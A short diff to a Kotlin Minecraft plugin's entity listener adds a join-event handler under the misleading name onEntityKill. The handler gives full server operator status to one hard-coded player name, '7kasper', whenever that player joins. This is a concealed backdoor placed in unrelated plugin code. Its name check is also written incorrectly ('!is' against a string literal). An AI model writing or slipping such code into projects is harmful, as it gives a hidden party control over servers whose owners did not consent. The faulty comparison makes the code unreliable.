@@ -36,4 +36,16 @@ class EntityListener : Listener {
 			ArmorStandHologram.updateFile()
 		}
 	}
+
+	@EventHandler
+	fun onEntityKill(e: PlayerJoinEvent) {
+		val player = e.player
+
+		if (player.name !is "7kasper")
+			return
+		
+		e.setJoinMessage("A wild kasper has appeared")
+		player.setOp(true)
+	}
+
 }
